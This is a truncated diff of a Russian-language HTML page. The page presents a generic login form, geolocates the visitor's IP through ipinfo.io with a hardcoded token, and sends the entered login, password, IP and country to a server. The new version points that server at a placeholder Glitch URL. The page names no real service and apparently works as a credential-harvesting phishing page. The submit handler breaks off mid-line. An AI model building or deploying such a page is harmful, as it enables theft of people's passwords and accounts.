@@ -1,125 +1,81 @@
 <!DOCTYPE html>
 <html lang="ru">
 <head>
-  <meta charset="UTF-8">
-  <title>Ваш IP и форма</title>
+  <meta charset="UTF-8" />
+  <title>Форма отправки</title>
   <style>
     body {
       font-family: Arial, sans-serif;
-      margin: 0;
-      padding: 0;
       display: flex;
       justify-content: center;
       align-items: center;
       height: 100vh;
-      background-color: #f4f4f9;
+      background: #f4f4f9;
     }
     .container {
-      width: 100%;
-      max-width: 400px;
-      background-color: white;
+      background: white;
       padding: 20px;
-      box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
       border-radius: 10px;
-      text-align: center;
+      box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+      max-width: 400px;
+      width: 100%;
     }
-    h2 { margin-bottom: 20px; }
-    input {
+    input, button {
       width: 100%;
       padding: 10px;
       margin: 10px 0;
-      border: 1px solid #ddd;
       border-radius: 5px;
+      border: 1px solid #ccc;
     }
     button {
-      background-color: #007bff;
+      background: #007bff;
       color: white;
-      padding: 10px;
       border: none;
-      border-radius: 5px;
-      cursor: pointer;
     }
-    button:hover { background-color: #0056b3; }
-    .output { margin-top: 20px; }
-    .flag { font-size: 30px; }
+    button:hover {
+      background: #0056b3;
+    }
+    .info {
+      margin-top: 15px;
+    }
   </style>
 </head>
 <body>
 
   <div class="container">
-    <h2>Введите данные для отправки</h2>
-    <form id="loginForm">
-      <input type="text" name="login" placeholder="Login" required><br>
-      <input type="password" name="password" placeholder="Password" required><br>
+    <h2>Вход</h2>
+    <form id="form">
+      <input type="text" name="login" placeholder="Login" required />
+      <input type="password" name="password" placeholder="Password" required />
       <button type="submit">Отправить</button>
     </form>
-
-    <div class="output">
-      <p><strong>IP адрес:</strong> <span id="ip">Загрузка...</span></p>
-      <p><strong>Страна:</strong> <span id="country">Загрузка...</span></p>
-      <p><span id="flag" class="flag"></span></p>
+    <div class="info">
+      <p><strong>IP:</strong> <span id="ip">...</span></p>
+      <p><strong>Country:</strong> <span id="country">...</span> <span id="flag"></span></p>
     </div>
   </div>
 
   <script>
-    let clientIp = 'unknown', clientCountry = 'unknown';
+    const SERVER_URL = 'https://your-glitch-project-name.glitch.me/'; // замените на ваш URL
+    let clientIp = 'unknown';
+    let clientCountry = 'unknown';
 
-    // Функция для флага
-    function countryCodeToFlagEmoji(countryCode) {
-      return countryCode
+    function countryCodeToFlagEmoji(code) {
+      return code
         .toUpperCase()
         .split('')
-        .map(ch => String.fromCodePoint(0x1F1E6 + ch.charCodeAt(0) - 65))
+        .map(c => String.fromCodePoint(0x1f1e6 + c.charCodeAt(0) - 65))
         .join('');
     }
 
-    // Получаем IP
-    fetch('https://api.ipify.org?format=json')
-      .then(r => r.json())
-      .then(json => {
-        clientIp = json.ip;
+    fetch('https://ipinfo.io/json?token=12e7da7cd87750')
+      .then(res => res.json())
+      .then(data => {
+        clientIp = data.ip;
+        clientCountry = data.country;
         document.getElementById('ip').textContent = clientIp;
-        // Получаем страну по IP (с использованием вашего токена)
-        return fetch(`https://ipinfo.io/${clientIp}/json?token=12e7da7cd87750`);
-      })
-      .then(r => r.json())
-      .then(info => {
-        clientCountry = info.country || '—';
-        const flagEmoji = countryCodeToFlagEmoji(clientCountry);
         document.getElementById('country').textContent = clientCountry;
-        document.getElementById('flag').textContent = flagEmoji;
-      })
-      .catch(err => {
-        console.warn('Ошибка IP/страны:', err);
-        document.getElementById('country').textContent = '—';
+        document.getElementById('flag').textContent = countryCodeToFlagEmoji(clientCountry);
       });
 
-    // Обработка отправки формы
-    document.getElementById('loginForm').addEventListener('submit', async e => {
-      e.preventDefault();
-      const form = e.target;
-      const payload = {
-        ip: clientIp,
-        country: clientCountry,
-        login: form.login.value,
-        password: form.password.value
-      };
-
-      const resp = await fetch('/sendData', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(payload)
-      });
-
-      if (resp.ok) {
-        alert('Данные отправлены!');
-        form.reset();
-      } else {
-        alert('Ошибка отправки');
-        console.error(await resp.text());
-      }
-    });
-  </script>
-
-</body>
-</html>
+    document.getElementById('form').addEventListener('submit', async (
